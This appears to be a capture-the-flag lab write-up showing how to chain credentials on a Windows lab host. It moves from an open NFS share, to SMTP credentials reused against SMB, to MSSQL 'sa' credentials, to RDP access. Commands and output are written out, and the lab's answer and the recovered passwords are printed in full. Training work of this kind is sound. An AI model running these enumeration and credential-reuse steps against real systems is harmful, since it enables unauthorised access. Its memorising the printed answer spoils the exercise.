# Footprinting Lab — Medium

## Scenario

The **second** server is one that everyone on the internal network can access — a prime target for attackers, so it was added to scope. The goal: gather as much information as possible and use it against the server. A user named **HTB** was created as proof; we need that user's credentials.

- **Target:** `10.129.202.41`

> **Objective:** Find the user `HTB` and submit its password.
> **Answer:** `lnch7ehrdn43i7AoqVPK4zWR`
>
> **Credential chain discovered along the way:**
> - `alex:lol123!mD` (SMTP config, found in NFS)
> - `sa:87N1ns@slls83` (found in SMB `devshare`)

---

## Step 1 — Port Scan

```text
PORT     STATE SERVICE        VERSION
111/tcp  open  rpcbind        (RPC #100000)
135/tcp  open  msrpc          Microsoft Windows RPC
139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nlockmgr       (RPC #100021)        <- NFS
3389/tcp open  ms-wbt-server  Microsoft Terminal Services (RDP)
```

This is a **Windows** host (`WINMEDIUM`) exposing **SMB (445)**, **RPC (135)**, **RDP (3389)**, and **NFS (2049)**.

## Step 2 — NFS Enumeration

```shell
$ sudo nmap --script nfs* 10.129.202.41 -sV -p111,2049

| nfs-showmount:
|_  /TechSupport
| nfs-ls: Volume /TechSupport
| rwx------ 4294967294 4294967294 ... ticket4238791283649.txt
| ... (eight ticket files, mostly size 0)
```

The `/TechSupport` export is accessible to everyone.

## Step 3 — Mount and Read the Tickets

```shell
$ sudo mount -t nfs -o vers=3,tcp,nolock 10.129.202.41:/TechSupport ~/target-NFS
$ sudo ls -la ~/target-NFS/
-rwx------ 1 4294967294 4294967294 1305 ... ticket4238791283782.txt
```

> Most files were empty, but **one** ticket held a support conversation containing an SMTP config — including credentials:

```text
01:42 PM | alex: here it is:
 smtp {
    host=smtp.web.dev.inlanefreight.htb
    user="alex"
    password="lol123!mD"
    from="alex.g@web.dev.inlanefreight.htb"
```

> **Recovered:** `alex:lol123!mD`

## Step 4 — Reuse Credentials Against SMB

Test whether `alex` can access SMB shares:

```shell
$ smbclient -U alex -L //10.129.202.41/
Password for [WORKGROUP\alex]:
	Sharename   Type   Comment
	---------   ----   -------
	ADMIN$      Disk   Remote Admin
	C$          Disk   Default share
	devshare    Disk
	IPC$        IPC    Remote IPC
	Users       Disk
```

> Credentials are valid. `devshare` is the non-default share — investigate it.

## Step 5 — Loot the SMB Share

```shell
$ smbclient -U alex //10.129.202.41/devshare
smb: \> ls
  important.txt    A    16  ...
smb: \> get important.txt
smb: \> exit

$ cat important.txt
sa:87N1ns@slls83
```

> **Recovered:** `sa:87N1ns@slls83` — the MSSQL `sa` (system administrator) account.

## Step 6 — RDP In and Query MSSQL

Log in over RDP using alex's credentials:

```shell
$ xfreerdp3 /v:10.129.202.41 /u:alex /p:'lol123!mD' /cert:ignore
```

Then, inside the session, run MSSQL as the `sa` account and query for the HTB user:

```sql
SELECT * FROM devsacc WHERE name='HTB';

157    HTB    lnch7ehrdn43i7AoqVPK4zWR
```

---

## Takeaways

- This lab is a **credential-chaining** exercise: NFS ticket → `alex` SMTP creds → SMB share → `sa` MSSQL creds → RDP + MSSQL query → the HTB password.
- When most files in a share look empty, **check sizes individually** — the one non-empty ticket held everything.
- **Credential reuse** across services (SMTP → SMB) is the central theme; always try recovered creds against every other service on the host.
